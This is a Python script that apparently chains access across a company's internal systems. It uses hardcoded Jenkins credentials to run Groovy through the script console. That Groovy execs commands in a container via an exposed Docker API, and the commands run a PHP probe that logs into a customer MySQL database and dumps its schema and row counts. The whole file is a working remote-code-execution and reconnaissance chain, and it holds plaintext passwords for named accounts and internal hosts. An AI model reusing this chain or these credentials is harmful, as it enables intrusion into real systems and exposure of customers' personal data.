import requests
import json
import urllib3
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

sess = requests.Session()
sess.auth = (USER, PASS)
sess.verify = False

def get_crumb():
    r = sess.get(f"{JENKINS}/crumbIssuer/api/json", timeout=30)
    r.raise_for_status()
    d = r.json()
    return {d["crumbRequestField"]: d["crumb"]}

def jenkins_groovy(groovy_code):
    headers = get_crumb()
    r = sess.post(f"{JENKINS}/scriptText", data={"script": groovy_code}, headers=headers, timeout=120)
    return r.text

def run_php_in_docker(php_code):
    # Escape quotes and backslashes for groovy string
    # We will write php code to a file in container or execute php -r
    groovy = f'''
import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def cid = "5b32e909c295"

def dockerExec(String containerId, List cmd) {{
    def dockerHost = "172.27.140.148"
    def dockerPort = 4243
    def url = new URL("http://${{dockerHost}}:${{dockerPort}}/containers/${{containerId}}/exec")
    def conn = url.openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setRequestProperty("Content-Type", "application/json")
    conn.setConnectTimeout(5000)
    conn.setReadTimeout(60000)
    def body = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: cmd])
    conn.outputStream.write(body.bytes)
    conn.outputStream.flush()
    def execResp = conn.inputStream.text
    def execData = new JsonSlurper().parseText(execResp)
    def execId = execData.Id

    def startUrl = new URL("http://${{dockerHost}}:${{dockerPort}}/exec/${{execId}}/start")
    def startConn = startUrl.openConnection()
    startConn.setRequestMethod("POST")
    startConn.setDoOutput(true)
    startConn.setRequestProperty("Content-Type", "application/json")
    startConn.setConnectTimeout(5000)
    startConn.setReadTimeout(60000)
    startConn.outputStream.write('{{"Detach":false,"Tty":false}}'.bytes)
    startConn.outputStream.flush()
    
    def is = startConn.inputStream
    def baos = new ByteArrayOutputStream()
    def buf = new byte[8192]
    int n
    while ((n = is.read(buf)) != -1) {{
        baos.write(buf, 0, n)
    }}
    def raw = baos.toByteArray()
    
    // Demux docker stream
    def output = new StringBuilder()
    int pos = 0
    while (pos + 8 <= raw.length) {{
        int frameLen = ((raw[pos+4] & 0xFF) << 24) | ((raw[pos+5] & 0xFF) << 16) | ((raw[pos+6] & 0xFF) << 8) | (raw[pos+7] & 0xFF)
        pos += 8
        if (pos + frameLen <= raw.length) {{
            output.append(new String(raw, pos, frameLen, "UTF-8"))
        }}
        pos += frameLen
    }}
    if (output.length() == 0 && raw.length > 0) {{
        return new String(raw, "UTF-8")
    }}
    return output.toString()
}}

// Write php script
def b64Script = "{php_code.encode('utf-8').hex()}"
def writeCmd = ["bash", "-c", "python -c \\"import binascii; open('/tmp/probe.php','wb').write(binascii.unhexlify('${{b64Script}}'))\\""]
dockerExec(cid, writeCmd)

def runCmd = ["php", "/tmp/probe.php"]
println dockerExec(cid, runCmd)
'''
    return jenkins_groovy(groovy)

probe_php = """<?php
$host = '172.27.141.6';
$port = 3308;
$user = 'apifincadodev';
$pass = '1q2w3e4r5t6y';
$db   = 'tienda';

$m = new mysqli($host, $user, $pass, $db, $port);
if ($m->connect_error) {
    die("CONNECT_ERROR: " . $m->connect_error . "\\n");
}
$m->set_charset("utf8");

echo "=== DESCRIBE tienda.clientes ===\\n";
$r = $m->query("DESCRIBE tienda.clientes");
if ($r) {
    while ($row = $r->fetch_assoc()) {
        echo sprintf("%-30s %-20s %-10s %-10s\\n", $row['Field'], $row['Type'], $row['Null'], $row['Key']);
    }
} else {
    echo "ERROR: " . $m->error . "\\n";
}

echo "\\n=== DESCRIBE tienda.datos_clientes ===\\n";
$r = $m->query("DESCRIBE tienda.datos_clientes");
if ($r) {
    while ($row = $r->fetch_assoc()) {
        echo sprintf("%-30s %-20s %-10s %-10s\\n", $row['Field'], $row['Type'], $row['Null'], $row['Key']);
    }
} else {
    echo "ERROR: " . $m->error . "\\n";
}

echo "\\n=== COUNTS ===\\n";
$r = $m->query("SELECT COUNT(*) as c FROM tienda.clientes");
$row = $r->fetch_assoc();
echo "COUNT(tienda.clientes): " . $row['c'] . "\\n";

$r = $m->query("SELECT COUNT(*) as c FROM tienda.datos_clientes");
$row = $r->fetch_assoc();
echo "COUNT(tienda.datos_clientes): " . $row['c'] . "\\n";

echo "\\n=== DATE CHECKS ===\\n";
// Let's check date columns in clientes
$r = $m->query("SELECT MAX(fecha_creacion) as max_fc, MIN(fecha_creacion) as min_fc FROM tienda.clientes");
if ($r) {
    $row = $r->fetch_assoc();
    echo "clientes.fecha_creacion: MIN=" . $row['min_fc'] . " MAX=" . $row['max_fc'] . "\\n";
}

$m->close();
?>"""

if __name__ == '__main__':
    print("[*] Running probe...")
    out = run_php_in_docker(probe_php)
    print(out)
